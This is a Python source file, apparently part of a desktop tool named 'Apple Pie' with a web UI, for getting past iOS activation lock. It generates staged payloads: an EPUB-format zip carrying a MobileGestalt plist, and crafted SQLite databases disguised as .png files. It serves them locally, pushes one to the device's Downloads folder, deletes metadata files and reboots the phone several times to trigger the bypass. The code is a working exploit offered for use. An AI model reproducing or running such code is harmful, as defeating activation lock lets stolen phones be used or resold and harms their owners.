                "iPhone14-7": "iPhone 14",
                "iPhone14-8": "iPhone 14 Plus",
                "iPhone15-2": "iPhone 14 Pro",
                "iPhone15-3": "iPhone 14 Pro Max",
                "iPhone15-4": "iPhone 15",
                "iPhone15-5": "iPhone 15 Plus",
                "iPhone16-1": "iPhone 15 Pro",
                "iPhone16-2": "iPhone 15 Pro Max",
                "iPhone17-1": "iPhone 16 Pro",
                "iPhone17-2": "iPhone 16 Pro Max",
                "iPhone17-3": "iPhone 16",
                "iPhone17-4": "iPhone 16 Plus",
                "iPhone17-5": "iPhone 16e",
                "iPhone18-1": "iPhone 17 Pro",
                "iPhone18-2": "iPhone 17 Pro Max",
                "iPhone18-3": "iPhone 17",
                "iPhone18-4": "iPhone 17 Air",
                "iPad8-11": "iPad Pro 12.9\" (4th gen)",
                "iPad11-1": "iPad mini 5 (Wi-Fi)",
                "iPad11-2": "iPad mini 5 (Cellular)",
                "iPad11-3": "iPad Air 3 (Wi-Fi)",
                "iPad11-4": "iPad Air 3 (Cellular)",
                "iPad11-6": "iPad 8 (Wi-Fi)",
                "iPad11-7": "iPad 8 (Cellular)",
                "iPad12-1": "iPad 9 (Wi-Fi)",
                "iPad12-2": "iPad 9 (Cellular)",
                "iPad13-1": "iPad Air 4 (Wi-Fi)",
                "iPad13-2": "iPad Air 4 (Cellular)",
                "iPad13-4": "iPad Pro 11\" (3rd gen)",
                "iPad13-8": "iPad Pro 12.9\" (5th gen)",
                "iPad13-16": "iPad Air 5",
                "iPad13-18": "iPad 10 (Wi-Fi)",
                "iPad14-1": "iPad mini 6 (Wi-Fi)",
                "iPad14-2": "iPad mini 6 (Cellular)",
                "iPad14-3": "iPad Pro 11\" (4th gen)",
                "iPad14-5": "iPad Pro 12.9\" (6th gen)",
                "iPad14-6": "iPad Pro 12.9\" (6th gen, Cellular)",
                "iPad14-10": "iPad Air (M2, 13-inch)",
            }
            name = override.get(folder, name)
            if os.path.exists(os.path.join(fdir, "com.apple.MobileGestalt.plist")) and not versions:
                # No version-specific dump for this device: the generic dump
                # covers the tool's supported iOS range.
                versions = ["All"]
            devices.append({
                "product_type": folder.replace('-', ','),
                "name": name,
                "versions": versions,
            })
        return devices

    def generate_payloads(self, prd: str, guid: str, sn: str, ver: str):
        """Generate all three payload stages locally (port of get2.php).

        Returns (stage1_url, stage2_url, local_stage3_path) or None."""
        plist_path, gestalt_ver = self._resolve_gestalt(prd, ver)
        if not plist_path:
            return None
        if gestalt_ver and str(ver) != gestalt_ver:
            self._log(f"[*] No gestalt dump for iOS {ver} - using the closest bundled one ({gestalt_ver}).")
        if not self._start_payload_server():
            return None

        staging = _data("staging")
        # Prune previous payload trees WITHOUT ever unlinking the staging root
        # itself: blindly rmtree-ing a directory that resolves somewhere live
        # (bad bundle path, symlink, user data) would wipe it. We only remove
        # children, and only when the parent really is inside data/.
        if os.path.isdir(staging) and os.path.basename(os.path.dirname(staging)) == "data":
            for entry in os.listdir(staging):
                p = os.path.join(staging, entry)
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p)
                    else:
                        os.remove(p)
                except OSError:
                    continue
        os.makedirs(staging, exist_ok=True)
        rand = secrets.token_hex(8)
        base_url = f"http://{self.api_host}:{self._payload_port}"

        # --- Stage 1: EPUB-compliant fixedfile ---
        step1_dir = os.path.join(staging, "firststp", rand)
        caches_dir = os.path.join(step1_dir, "Caches")
        os.makedirs(caches_dir, exist_ok=True)
        mimetype_path = os.path.join(caches_dir, "mimetype")
        with open(mimetype_path, "w") as f:
            f.write("application/epub+zip")
        zip_path = os.path.join(step1_dir, "temp.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(mimetype_path, "Caches/mimetype", compress_type=zipfile.ZIP_STORED)
            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist")
        os.remove(mimetype_path)
        os.rmdir(caches_dir)
        fixedfile_path = os.path.join(step1_dir, "fixedfile")
        os.replace(zip_path, fixedfile_path)
        stage1_url = f"{base_url}/firststp/{rand}/fixedfile"

        # --- Stage 2: BLDatabaseManager.sqlite -> belliloveu.png ---
        with open(_data("BLDatabaseManager.png"), "r", encoding="latin-1") as f:
            bl_dump = f.read()
        bl_dump = bl_dump.replace('KEYOOOOOO', stage1_url)
        step2_dir = os.path.join(staging, "2ndd", rand)
        os.makedirs(step2_dir, exist_ok=True)
        bl_sqlite = os.path.join(step2_dir, "BLDatabaseManager.sqlite")
        self._sqlite_from_dump(bl_dump, bl_sqlite)
        stage2_path = os.path.join(step2_dir, "belliloveu.png")
        os.replace(bl_sqlite, stage2_path)
        stage2_url = f"{base_url}/2ndd/{rand}/belliloveu.png"

        # --- Stage 3: downloads.28.sqlitedb -> apllefuckedhhh.png ---
        shutil.copy(_data("badfile.plist"), os.path.join(staging, "badfile.plist"))
        with open(_data("downloads.28.png"), "r", encoding="latin-1") as f:
            dl_dump = f.read()
        dl_dump = dl_dump.replace('https://google.com', stage2_url)
        dl_dump = dl_dump.replace('GOODKEY', guid)
        # Token-safe badfile URL patching: rewrite whatever http(s) URL points
        # at /badfile.plist (the upstream VPS IP is baked into the dump) to our
        # local serving URL - no hardcoded host lease, no stray phone-home.
        served_badfile = f"{base_url}/badfile.plist"
        url_match = re.search(r'https?://[^"\s]+/badfile\.plist', dl_dump)
        if url_match:
            dl_dump = dl_dump.replace(url_match.group(0), served_badfile)
        if "badfile.plist" not in dl_dump:
            dl_dump = dl_dump + served_badfile
        if re.search(r'194\.99\.21\.156', dl_dump):
            self._log("[*] downloads.28.png still references the upstream server - refusing payload.")
            return None
        step3_dir = os.path.join(staging, "last", rand)
        os.makedirs(step3_dir, exist_ok=True)
        final_db = os.path.join(step3_dir, "downloads.sqlitedb")
        self._sqlite_from_dump(dl_dump, final_db)
        stage3_path = os.path.join(step3_dir, "apllefuckedhhh.png")
        os.replace(final_db, stage3_path)

        return stage1_url, stage2_url, stage3_path
        
        


    ###############

    def ShowLoadingPopup(self, message: str):
        self._web(loading={"visible": True, "message": message})

    def HideLoadingPopup(self):
        self._web(loading={"visible": False, "message": ""})

    def StartHacktivating(self):
        if self._busy:
            self._log("[*] An activation is already running - ignoring duplicate request.")
            return
        self._busy = True
        threading.Thread(target=self.Hacktivating, daemon=True).start()

    def Hacktivating(self):
        """Run the full activation pipeline.

        Busy is cleared in a finally block so failure paths (missing device,
        bad payload, reboot timeout) can never leave the browser UI frozen.
        AFC operations use the pymobiledevice3 Python API directly - there is
        no pymobiledevice3.exe shim and no interactive input() anywhere.
        """
        global onlyFindGuid

        self._web(busy=True)
        try:
            self._log("[*] Process started!")
            time.sleep(0.4)

            output = self._probe_device()
            if not output or "ProductType" not in output or "SerialNumber" not in output:
                self._fail("Failed to connect to device!")
                return
            self._log("[*] Successfully connected to device!")

            if "--only-find-guid" in sys.argv[1:]:
                self._log("[*] --only-find-guid argument detected! Proceeding without activating...")
                onlyFindGuid = True
                self._log("[*] Starting GUID search... This may take a few minutes...")
                self.guid = self.get_guid_auto()
            else:
                bare = [a for a in sys.argv[1:] if not a.startswith("-")]
                if bare:
                    self.guid = bare[0]
                    self._log(f"[*] Using GUID: {bare[0]}")
                    onlyFindGuid = False
                else:
                    onlyFindGuid = False
                    self._log("[*] Starting GUID search... This may take a few minutes...")
                    self.guid = self.get_guid_auto()

            self._log(f"[*] GUID: {self.guid}")

            if not self.guid:
                self._log("[*] Could not get GUID!")
                reason = f"\n\nReason: {self._guid_error}" if self._guid_error else ""
                self._log(f"[*] Reason: {self._guid_error}")
                self._fail("Could not get GUID!" + reason +
                           "\n\nErase your device using Apple Configurator and then try again.")
                return

            if onlyFindGuid:
                return

            self.setProgress(progress=20)
            self._log("[*] Generating payload locally...")

            prd = self._idevice_value(output, "ProductType")
            sn = self._idevice_value(output, "SerialNumber")
            if not prd or not sn:
                self._fail("Could not read ProductType/SerialNumber from the device. "
                           "Unlock the device, trust this PC, and reconnect it.")
                return

            result = self.generate_payloads(prd, self.guid, sn, self.iOS)
            if not result:
                self._fail("Failed to generate payload! Is this device supported?")
                return

            stage1_url, stage2_url, stage3_path = result

            self.setProgress(progress=30)
            self._log("[*] Payload ready - serving over local network...")
            self.setProgress(progress=50)
            self._log("[*] Preparing payload...")

            local_db = "downloads.28.sqlitedb"
            if os.path.exists(local_db):
                os.remove(local_db)
            shutil.copy(stage3_path, local_db)
            if not os.path.exists(local_db) or os.path.getsize(local_db) == 0:
                self._fail("Failed to generate payload!")
                return

            self.setProgress(progress=55)
            self._log("[*] Validating generated files...")
            conn = sqlite3.connect(local_db)
            try:
                res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
                if res.fetchone()[0] == 0:
                    raise Exception("Invalid DB - no asset table found")
                res = conn.execute("SELECT COUNT(*) FROM asset")
                if res.fetchone()[0] == 0:
                    raise Exception("Invalid DB - no records in asset table")
                self._log("[*] Database validated.")
            except Exception:
                self._log("[*] Invalid database!")
                self._fail("Invalid database!")
                return
            finally:
                conn.close()

            self.setProgress(progress=65)
            self._log("[*] Uploading payload...")

            target = "/Downloads/downloads.28.sqlitedb"
            if not self._afc_push(local_db, target):
                self._fail("Error while uploading!")
                return
            self._log("[*] Uploaded!")
            self._log("[*] Payload successfully deployed!")

            self.setProgress(progress=75)
            self._log("[*] Cleaning up files and scanning for old files ...")

            self._afc_rm_safe("/iTunes_Control/iTunes/iTunesMetadata.plist",
                              ok_msg="Deleted old iTunesMetadata.plist !",
                              miss_msg="Old file not found, continuing ...")
            self._afc_rm_safe("/Books/asset.epub",
                              ok_msg="Deleted old asset.epub !",
                              miss_msg="Old file not found, continuing ...")
            self._afc_rm_safe("/iTunes_Control/iTunes/iTunesMetadata.plist.ext",
                              ok_msg="Deleted old iTunesMetadata.plist.ext !",
                              miss_msg="Old file not found, continuing ...")
            for wal_file in ["/Downloads/downloads.28.sqlitedb-wal", "/Downloads/downloads.28.sqlitedb-shm"]:
                self._afc_rm_safe(wal_file,
                                  ok_msg="Removed files!",
                                  miss_msg=f"{wal_file} not present!")

            self.setProgress(progress=80)
            self._log("[*] Rebooting device...")
            if not self.reboot_device():
                self._log("[*] Reboot failed! Skipping...")

            self._log("[*] Waiting 50s for iTunesMetadata.plist...")
            for _ in range(10):  # 10 x 5s = 50s (parity with upstream R1nderPest v2.5)
                time.sleep(5)

            src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
            dst_books = "/Books/iTunesMetadata.plist"

            self._log("[*] Copying files...")
            if self._afc_copy(src, dst_books):
                self._log("[*] Successfully copied!")
                self.setProgress(progress=89)
            else:
                self._log("[*] iTunesMetadata.plist not found!")
                self._log("[*] Make sure the iPhone is connected via USB and on the same Wi-Fi network as this computer")
                self._fail("Error while activating your device!")
                return

            self._log("[*] Rebooting...")
            if not self.reboot_device():
                self._log("[*] Reboot failed! Skipping...")

            self.setProgress(progress=90)
            self._log("[*] Copying files...")
            if self._afc_copy(dst_books, src):
                self._log("[*] Successfully copied files!")
            else:
                self._log("[*] Failed to copy files!")

            self._log("[*] Waiting for bookassetd...")
            self.setProgress(progress=96)
            time.sleep(40)

            self._log("[*] Rebooting...")
            self.reboot_device()

            self.setProgress(progress=100)
            time.sleep(4)
            self._log("[*] Done! Activate your device as usual.")
            self.ShowInfoPopup(button_text="Close", message="Activate your device as usual.", title="Done!")
            self._web(busy=False, unlock_disabled=True, unlock_text="Unlock")
        finally:
            self._busy = False
            self._web(busy=False)
            self._scan_paused = False

    def _fail(self, msg: str):
        """Abort the pipeline with a visible error popup (no frozen busy state)."""
        self._log(f"[*] {msg}")
        self.ShowInfoPopup(button_text="Close", message=msg, title="Error")

    def _run_async(self, coro):
        """Run a pymobiledevice3 coroutine on the engine's private event loop.

        pymobiledevice3 10.x exposes an async API while the engine is synchronous,
        so every async entry point goes through here. A coroutine cannot be awaited
        twice, so a failure inside the coroutine is surfaced as a RuntimeError the
        caller already handles.
        """
        if self._loop is None:
            self._loop = asyncio.new_event_loop()
        return self._loop.run_until_complete(coro)

    def _afc(self) -> Optional[AfcService]:
        """Open one connected AFC session over USB via the pymobiledevice3 API."""
        try:
            lockdown = self._run_async(create_using_usbmux())
            afc = AfcService(lockdown)
            # AfcService.connect() is a coroutine in 10.x; without it every
            # subsequent file operation fails on a closed channel.
            self._run_async(afc.connect())
            return afc
        except Exception as e:
            self._log(f"[*] AFC connection failed: {e}")
            return None

    def _afc_close(self, afc) -> None:
        """Close an AFC session (aclose is a coroutine in 10.x); never raises."""
        if afc is None:
            return
        try:
            self._run_async(afc.aclose())
        except Exception:
            pass

    def _afc_rm_safe(self, remote: str, ok_msg: str = None, miss_msg: str = None) -> bool:
        """Remove a file on the device; a missing file is not an error."""
        afc = self._afc()
        if afc is None:
            if miss_msg:
                self._log(f"[*] {miss_msg}")
            return False
        try:
            try:
                failed = afc.rm(remote, force=True)
                if not failed:
                    if ok_msg:
                        self._log(f"[*] {ok_msg}")
                    return True
            except Exception:
                pass
            if miss_msg:
                self._log(f"[*] {miss_msg}")
            return False
        finally:
            self._afc_close(afc)

    def _afc_push(self, local: str, remote: str) -> bool:
        afc = self._afc()
        if afc is None:
            return False
        try:
            afc.push(local, remote, progress_bar=False)
            return True
        except Exception as e:
            self._log(f"[*] AFC push failed: {e}")
            return False
        finally:
            self._afc_close(afc)

    def _afc_copy(self, src: str, dst: str) -> bool:
        """Copy a file on-device by pulling to a temp file and pushing it back."""
        afc = self._afc()
        if afc is None:
            return False
        tmp = "temp_plist_copy.plist"
        try:
            # AfcService.pull is a coroutine in 10.x - calling it without awaiting
            # would return a coroutine and never write the temp file.
            self._run_async(afc.pull(src, tmp, progress_bar=False))
            if not os.path.exists(tmp) or os.path.getsize(tmp) == 0:
                return False
            afc.push(tmp, dst, progress_bar=False)
            return True
        except Exception as e:
            self._log(f"[*] AFC copy failed: {e}")
            return False
        finally:
            self._afc_close(afc)
            if os.path.exists(tmp):
                try:
                    os.remove(tmp)
                except OSError:
                    pass
    def ClosePopup(self):
        self._web(popup={"visible": False, "title": "", "message": "", "button": "Close"})

    def ShowInfoPopup(self, button_text: str, message: str, title: str):
        self._web(popup={"visible": True, "title": title, "message": message, "button": button_text})

    def SearchingForDevices(self):
        """Background device-detection loop (kept alive for the whole session).

        Never breaks and never sys.exit()s: a device can be unplugged and
        reconnected, or the first connection can fail to parse, without having
        to restart the app. State is published via _web/_log and failure paths
        degrade to 'Waiting for device' - the UI can never freeze showing stale
        connected/Unlocked fields after the scan thread exits."""
        global version

        while True:
            if self._scan_paused:
                time.sleep(1)
                continue

            output = self._probe_device()

            if not output:
                if not self._device_flow_done and not self._busy:
                    # Upstream parity: the original set "Searching for devices..."
                    # on every empty poll. Without this the UI sits on the initial
                    # "Starting..." forever and looks hung with no diagnostics.
                    # Skipped while a bypass is running so the status line and the
                    # message list stay put until the run actually finishes -
                    # otherwise every device bounce during the workflow overwrites
                    # the progress the user is watching.
                    self._web(status="Searching for devices...")
                if self._device_flow_done and not self._busy:
                    # Device dropped mid-session: clear the stale connected
                    # fields and any leftover lock-state so the UI goes back
                    # to the intro screen instead of showing ghost data.
                    self._device_flow_done = False
                    self._web(status="Waiting for device to connect",
                              connected=False,
                              device_name="", device_info="", udid="",
                              activation="", ios="", supported=False,
                              unlock_disabled=False, unlock_text="Unlock",
                              phase="intro")
                time.sleep(1)
                continue

            if not self._busy:
                # A bypass reboots the device several times on purpose, so the
                # scan thread must not stomp the running workflow's status with
                # "Device connected!" each time the phone comes back.
                self._web(status="Device connected!", connected=True)

            if self._device_flow_done:
                time.sleep(1)
                continue

            ProductVersion = self._idevice_value(output, "ProductVersion")
            ProductType = self._idevice_value(output, "ProductType")
            UDID = self._idevice_value(output, "UniqueDeviceID")
            DeviceName = self._idevice_value(output, "DeviceName")
            ActivationState = self._idevice_value(output, "ActivationState")

            # ProductType + UDID are the only values the payload pipeline cannot
            # work without, so they are the only ones worth waiting for.
            if not ProductType or not UDID:
                self._log("[*] Could not get device info!")
                self._web(status="Could not get device info!")
                time.sleep(2)
                continue

            self.iOS = f"{ProductVersion}"
            self._web(device_name=DeviceName or "Unknown device",
                      udid=f"UDID: {UDID}",
                      ios=f"iOS Version: {ProductVersion or 'Unknown'}")
            if ActivationState == "Activated":
                self._web(activation="Activation state: Yes", unlock_disabled=True, unlock_text="Unlocked")
                self._log("[*] Your device is already activated!")
            else:
                # A missing ActivationState means the device is not activated -
                # i.e. it is activation-locked, which is the state we want.
                self._web(activation="Activation state: No")
            self._device_flow_done = True

            time.sleep(0.5)
            self._web(status="Checking for updates...")
            self._log("[*] Checking for updates...")
            time.sleep(1)
            try:
                r = requests.get(url="https://applepie-default-rtdb.firebaseio.com/.json", timeout=10)
                serverVERSION = r.json()["version"]

                def _ver_tuple(v):
                    return tuple(int(x) for x in str(v).split(".")[:3])

                if _ver_tuple(serverVERSION) > _ver_tuple(version):
                    print(f"[*] Update available! [v{version} ==> v{serverVERSION}]")
                    self._log(f"[*] Update available! [v{version} ==> v{serverVERSION}]")
                    self.ShowInfoPopup(title="Update Available!",
                                       message=f"The new version of Apple Pie {serverVERSION} is available!",
                                       button_text="Okay")
                else:
                    print("[*] No updates found!")
                    self._log("[*] No updates found!")
            except Exception as e:
                print(f"[*] Error checking for updates! {e}")
                self.ShowInfoPopup(button_text="Close", message="Error checking for updates!", title="Warning")
                self._log("[*] Error checking for updates!")

            self._log("#### WARNING! ####")
            self._log("Before activating, make sure the iPhone is connected via USB, on the same Wi-Fi network as this computer, and is on the activation lock screen")
            self._web(phase="home")

            if self.is_device_supported(ProductType, self.iOS):
                self._web(device_info=f"iOS Version: {ProductVersion}, Supported", supported=True)
                self.ShowInfoPopup(button_text="Close", message="Your device is supported!", title="Status")
            else:
                self._web(device_info=f"iOS Version: {ProductVersion}, Unsupported", supported=False)
                self._web(unlock_disabled=True, unlock_text="Unsupported.")
                self.ShowInfoPopup(button_text="Close", message="Your device is unsupported!", title="Status")

            time.sleep(1)
if __name__ == "__main__":
    import webui
    import webbrowser
    engine = ApplePieEngine()
    engine.start()
    port = webui.serve(engine, web_state, _web_lock)
    if port is None:
        print("[*] Could not find a free WebUI port.")
        sys.exit(1)
    host = engine.get_local_host()
    url = f"http://localhost:{port}"
    print(f"[*] WebUI running at http://{host}:{port}")
    print(f"[*] Open {url} in your browser")
    threading.Thread(target=lambda: (time.sleep(0.6), webbrowser.open(url)), daemon=True).start()

    # System Tray Icon (Open / Exit)
    try:
        import pystray
        from PIL import Image

        icon_path = os.path.join(_root_dir(), "icon.ico")
        if not os.path.exists(icon_path):
            icon_path = os.path.join(os.path.dirname(os.path.abspath(sys.executable)), "icon.ico")
        if not os.path.exists(icon_path):
            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")

        if os.path.exists(icon_path):
            tray_img = Image.open(icon_path)
        else:
            tray_img = Image.new("RGBA", (32, 32), (10, 132, 255, 255))

        def _on_open(icon, item):
            webbrowser.open(url)

        def _on_exit(icon, item):
            icon.stop()
            engine._cleanup()
            os._exit(0)

        tray_menu = pystray.Menu(
            pystray.MenuItem("Open ApplePie WebUI", _on_open, default=True),
            pystray.MenuItem("Exit", _on_exit)
        )
        tray_icon = pystray.Icon("ApplePie", tray_img, "Apple Pie", tray_menu)
        tray_icon.run()
    except Exception as e:
        print(f"[*] Tray icon error: {e}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        engine._cleanup()
        sys.exit(0)
